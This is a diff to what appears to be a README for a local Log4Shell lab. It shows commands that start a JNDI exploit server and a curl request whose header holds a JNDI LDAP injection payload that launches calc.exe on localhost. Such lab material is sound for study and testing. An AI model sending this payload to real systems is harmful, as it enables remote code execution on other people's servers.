@@ -104,10 +104,10 @@ https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/
 
     git clone https://github.com/HenryFBP/JNDI-Exploit-Server
     cd JNDI-Exploit-Server
-    mvn clean package
-    java -jar JNDIExploit.jar
+    # mvn clean package # disabled due to issues with dependencies.
+    java -jar .\etc\JNDIExploit-1.2-SNAPSHOT-from-black9-Log4shell_JNDIExploit.jar -i localhost -p 8081
 
 ### Send payload to vulnerable target (need GNU curl.exe...)
 
     choco install -y curl
-    curl.exe 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://localhost:1389/Basic/Command/Base64/Y2FsYy5leGU=}'
+    curl.exe 127.0.0.1:8080 -H "X-Api-Version: ${jndi:ldap://localhost:1389/Basic/Command/Base64/Y2FsYy5leGU=}"
